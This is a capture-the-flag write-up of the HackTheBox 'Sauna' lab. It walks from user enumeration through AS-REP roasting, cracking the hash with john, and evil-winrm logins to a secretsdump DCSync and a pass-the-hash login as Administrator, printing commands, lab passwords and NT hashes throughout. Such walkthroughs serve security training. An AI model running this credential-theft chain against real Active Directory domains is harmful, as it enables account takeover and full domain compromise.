---
title: HackTheBox Sauna
author: Marius Kimmina
date: 2020-07-18 14:10:00 +0800
categories: [CTF, HackTheBox]
tags: [Windows, Kerberos, Privilege Escalation]
published: true
---


## 0x0 Introduction
Welcome to another HackTheBox writeup, in this one we have to enumerate users, make heavy use of impacket scripts to kerberoast one of the users and we utilize winpeas to escalate our privileges.
![image](/assets/images/Sauna/sauna_infocard.png "Sauna")

## 0x1 Getting a foothold (and the User)

As always I started of with an nmap scan

```
nmap -sC -sV -oN nmap 10.10.10.181
```

which revealed that this is most definetly a Domain Controller since its running ldap, kerberos and dns:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0                                                                                                                      
| http-methods:                                                                                                             
|_  Potentially risky methods: TRACE                                                                                                                     
|_http-server-header: Microsoft-IIS/10.0                                                                                                                         
|_http-title: Egotistical Bank :: Home                                                                                                                      
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-18 12:26:21Z)                                                                                
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                                       
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                               
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)                                     
445/tcp  open  microsoft-ds?                                                                                                              
464/tcp  open  kpasswd5?                                                                                                                 
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                                           
636/tcp  open  tcpwrapped                                                                                                                
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)                                     
3269/tcp open  tcpwrapped 
```

On the Website (http://10.10.10.175) we could find some potential usernames: 
![image](/assets/images/Sauna/sauna_meet_the_team.png "Users")

I created a File with possible Usernames from this:
```
Fergus Smith
Shaun Coins
Hugo Bear
Steven Kerb
Bowie Taylor
Sophie Driver
F.Smith
S.Coins
H.Bear
S.Kerb
B.Taylor
S.Driver
f.smith
s.coins
h.bear
s.kerb
b.taylor
s.driver
fsmith
scoins
hbear
skerb
btaylor
sdriver
```

This was about all there was for the Website.  
So as my next step I was going for some LDAP enumeration. First we need to get the Domain Name.

```
$ ldapsearch -x -h 10.10.10.175 -s base namingcontexts
....
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
....
```

Then, using the revealed domain name of "EGOTISTICAL-BANK.LOCAL" I could enumerate further and found a potential user, which I also added to the list of users:

```
ldapsearch -x -h 10.10.10.175 -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
....
....
# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

I tried to connect to the box with rpcclient and anonymous access, while successfull I didn't have enough permissions to run the interesting stuff

```
rpcclient $> enumdomusers 
result was NT_STATUS_ACCESS_DENIED
```

After a while I got the idea to try the impacket scripts, espescially *GetNPUsers.py* since we already have some usernames

```
$ python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users -dc-ip 10.10.10.175 -o pwhash.txt  -format john
GetNPUsers.py:413: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if domain is '':
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

cat pwhash.txt 
$krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL:d2effe1c2fc2cba7649731cb125ea1b4$d4f18e47bd77db87a6be1692cbce313cab32700f416d4db658c1bedbed3b9773cf7d1e53fafb79f9473a85f66104eacc30a697e421a24568d6b71e5e437d90cd6eaf625336051a4e8039a04eae293c9612d0273ec5eab9c949a841cbe81d3c74fa0f5bb10d9f357a9e609be3b37ed1b8a9f81a07d8697ab2af2541706ab4da8cf2d4b822085ee2a2418a4c6cc0a5cc1a5bbbb31e42e060504a187debd546f8582ac8de963c02fdaae2aca56d4d04730f8f31e380f6a2939a968f04cc36bbfa3978cf3337d28031de799b9e004037571955f919f244140467fe402a1bf73dadf012d59716ff938045eb45553cdd1fbbf854372a7fac6519044a7c96edb100e05d
```

Now I have a the Passwordhash for the user *fsmith* and I can ask my friend john if he can help me with this.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt pwhash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:07 DONE (2020-07-18 08:15) 0.1347g/s 1420Kp/s 1420Kc/s 1420KC/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

As *fsmith* we can now use rpcclient with proper permissions and find a service account

```
$ rpcclient -U fsmith 10.10.10.175
Enter WORKGROUP\fsmith's password: 
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[HSmith] rid:[0x44f]
user:[FSmith] rid:[0x451]
user:[svc_loanmgr] rid:[0x454]
```

Sadly this service account is not vulnerable to the Kerberous Preauth attack that we used to get the hash for fsmith.
We are able to get on the Box with winrm as fsmtih though.  
That being said we are able to get onto the box now with evil-winrm:

```
$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

From this point you can just switch direktories to his desktop and you get the user-flag

# 0x2 Becoming Administrator

As the first step we downloaded winpeas and used the upload function of evil-winrm to get it on the box. For those who may not know, winpeas is part of the privilege-escalation-awesome-suite (peas) and it's essenitally a script that looks for all kinds of possible misconfigurations that could lead to us being able to escalate our privileges.  
And winpeas did indeed find something useful, it found the login credentials for svc_loanmgr account.  
![image](/assets/images/Sauna/sauna_svc_pw.png "svc_pw")

```
$ evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
```

Now with this password for the svc account we can use another impacket script, namely, secretsdump.py

```
# python3 secretsdump.py 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
....
```

Now we are able to use the *pass-the-hash* function of evil-winrm to log in as Administrator

```
$ evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

We are done here, I hope you liked the writeup.
